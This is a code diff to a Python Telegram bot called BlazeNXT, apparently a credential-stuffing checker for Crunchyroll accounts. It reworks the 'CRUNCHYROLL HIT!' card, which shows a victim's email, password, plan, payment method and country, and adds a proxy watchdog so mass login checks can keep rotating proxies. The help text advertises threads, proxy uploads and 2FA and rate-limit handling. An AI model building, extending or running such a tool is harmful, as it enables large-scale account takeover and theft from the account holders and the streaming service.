@@ -1525,56 +1525,49 @@ def access_denied_html() -> str:
     )
 
 def hit_card(entry: dict) -> str:
-    """⭐ Hit card — UI improved, clean sections"""
+    """⭐ CRUNCHYROLL HIT! — compact attractive (user requested)"""
     cred, d = entry["cred"], entry.get("data") or {}
-    # Header with fancy border
-    L = [
-        "╭────────────────────────╮",
-        "│  ⭐ <b>CRUNCHYROLL HIT!</b> ⭐  │",
-        "╰────────────────────────╯",
-    ]
+    L = []
+    L.append("⭐ <b>CRUNCHYROLL HIT!</b>")
+    L.append("━━━━━━━━━━━━━━━━━━━━━")
     if cred["type"] == "email":
         L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
         L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
     else:
         L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
-    L.append("┌─ <b>ACCOUNT</b> ──────────────┐")
-    L.append(f"│ 📧 <code>{esc(cred['value'])}</code>" if cred["type"] == "email" else f"│ 🔑 <code>{esc(cred['value'][:40])}</code>")
-    if cred["type"] == "email":
-        L.append(f"│ 🔑 <code>{esc(cred.get('password', ''))}</code>")
-    L.append("└────────────────────────┘")
-    L.append("┌─ <b>SUBSCRIPTION</b> ─────────┐")
-    L.append(f"│ 💎 Plan: <code>{esc(d.get('plan') or 'Premium')}</code> • {'✅ Premium' if d.get('plan') else '✅'}")
-    L.append(f"│ 📺 Streams: <code>{esc(d.get('streams') or 'N/A')}</code> • 🆔 SKU: <code>{esc(d.get('sku') or 'N/A')}</code>")
-    L.append(f"│ 🏷️ Type: <code>{esc(d.get('plan_type') or 'N/A')}</code> • 🎁 Trial: {'✅' if d.get('trial') else '❌'}")
-    L.append("└────────────────────────┘")
-    L.append("┌─ <b>BILLING</b> ──────────────┐")
-    L.append(f"│ ⏳ Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code> • 📅 Days: <code>{esc(d.get('days_left') or 'N/A')}</code>")
-    L.append(f"│ 🔄 Renewal: <code>{esc(d.get('next_renewal') or d.get('expiry') or 'N/A')}</code>")
-    L.append(f"│ ♻️ Auto: {'✅' if d.get('renew') else '❌'} • ⏱ Billing: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
-    price = (str(d.get("price") or "0") + (" " + d["currency"] if d.get("currency") else ""))
-    L.append(f"│ 💰 Price: <code>{esc(price.strip())}</code> • 💱 Cur: <code>{esc(d.get('currency') or 'N/A')}</code>")
-    L.append(f"│ 💳 Pay: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
-    L.append("└────────────────────────┘")
-    # Account details
     L.append("━━━━━━━━━━━━━━━━━━━━━")
-    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}  • Created: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
-    if d.get("account_id"):
-        L.append(f"• Account ID: <code>{esc(d.get('account_id'))}</code>")
-    if d.get("external_id"):
-        L.append(f"• External ID: <code>{esc(d.get('external_id'))}</code>")
+    plan = d.get("plan") or "Premium"
+    L.append(f"• Plan: <code>{esc(plan)}</code>")
+    L.append(f"• Premium: ✅")
+    if d.get("expiry") or d.get("next_renewal"):
+        L.append(f"• Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code>")
+    if d.get("days_left"):
+        L.append(f"• Days Left: <code>{esc(str(d.get('days_left')))}</code>")
+    L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}")
+    L.append(f"• Free Trial: {'✅' if d.get('trial') else '❌'}")
+    if d.get("duration") or d.get("billing_cycle"):
+        L.append(f"• Plan Duration: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
+    price = str(d.get("price") or "0")
+    if d.get("currency"):
+        price += f" {d.get('currency')}"
+    L.append(f"• Plan Price: <code>{esc(price.strip())}</code>")
+    if d.get("plan_type"):
+        L.append(f"• Plan Type: <code>{esc(d.get('plan_type'))}</code>")
+    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}")
+    if d.get("created") or d.get("start_date"):
+        L.append(f"• Created Date: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
+    if d.get("payment") or d.get("payment_method"):
+        L.append(f"• Last Payment: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
+    if d.get("cc") or d.get("country_name"):
+        flag = flag_emoji(d.get("cc"))
+        country = d.get("country_name") or d.get("cc") or "N/A"
+        L.append(f"• Country: {flag + ' ' if flag else ''}<code>{esc(country)}</code>")
+    if d.get("streams"):
+        L.append(f"• Streams: <code>{esc(str(d.get('streams')))}</code>")
+    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0] if cred.get("value") else ""):
+        L.append(f"• User: <code>{esc(d.get('user'))}</code>")
     if d.get("sub_id"):
-        L.append(f"• Sub ID: <code>{esc(d.get('sub_id'))}</code>  • Status: <code>{esc(d.get('sub_status') or 'active')}</code>")
-    country = " ".join(x for x in (flag_emoji(d.get("cc")), esc(d.get("country_name"))) if x)
-    L.append(f"• Country: {country or 'N/A'}  • CC: <code>{esc(d.get('cc') or 'N/A')}</code>")
-    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0]):
-        L.append(f"• Profile: <code>{esc(d.get('user'))}</code>")
-    # Meta
-    L.append(f"• Checked At: <code>{esc(fmt_dt(now_utc()))}</code>")
-    if d.get("proxy_used"):
-        L.append(f"• Proxy: <code>{esc(d.get('proxy_used'))}</code>")
-    if d.get("info"):
-        L.append(f"• Info: <code>{esc(d.get('info'))}</code>")
+        L.append(f"• Sub ID: <code>{esc(d.get('sub_id')[:20])}</code>")
     L.append("━━━━━━━━━━━━━━━━━━━━━")
     L.append("🔥 <b>BlazeNXT</b>")
     return "\n".join(L)
@@ -1678,11 +1671,11 @@ def help_text() -> str:
         "│ 🎯 <b>Deep Check:</b> Fan / Mega / Ultimate • Expiry • Price • Trial\n"
         "│ 🔐 <b>Smart:</b> 2FA / Rate / Errors handled\n"
         "└────────────────────────┘\n"
-        "┌─ <b>👑 TOOLS (FREE FOR ALL)</b> ┐\n"
-        "│ 🛠️ Tools Panel: Proxies, Threads, Stats, Oxaam, TV\n"
+        "┌─ <b>⚙️ PROXY SYSTEM</b> ┐\n"
+        "│ ♻️ Auto-Fetch + 📥 Manual Upload\n"
         "│ 📊 Proxy Settings: Status, Loaded, Live\n"
         "│ 🧵 Set Threads: 50/100/200/300\n"
-        "│ 🤖 Oxaam auto-fetch • 📺 TV login\n"
+        "│ 🔄 Auto-refresh • 📤 Upload txt\n"
         "└────────────────────────┘\n"
         "╭────────────────────────╮\n"
         "│  🔥 <b>BlazeNXT</b> • <i>Fast • Free • Deep</i> 🔥  │\n"
@@ -1972,12 +1965,35 @@ async def _run_and_report(msg, uid: int, text: str):
         except Exception:
             pass
 
+    # Dual proxy: auto-fetch + manual pool both active
+    try:
+        ensure_proxies()
+    except Exception:
+        pass
+    async def _proxy_watchdog():
+        while True:
+            await asyncio.sleep(60)
+            try:
+                if proxy_count() < 10:
+                    await asyncio.to_thread(refresh_live_proxies, True)
+                if pool_size() > 0 and proxy_count() < 5:
+                    _load_pool_into_live()
+            except Exception:
+                pass
+            if note.text and "SCAN COMPLETE" in note.text:
+                break
+        return
+    wd_task = asyncio.create_task(_proxy_watchdog())
     try:
         results = await asyncio.to_thread(run_check, text, reporter, _hit_cb)
     except Exception as e:
         await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
                              parse_mode=ParseMode.HTML)
         return
+    try:
+        wd_task.cancel()
+    except Exception:
+        pass
     bump_checks(results["processed"])
     await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)
 
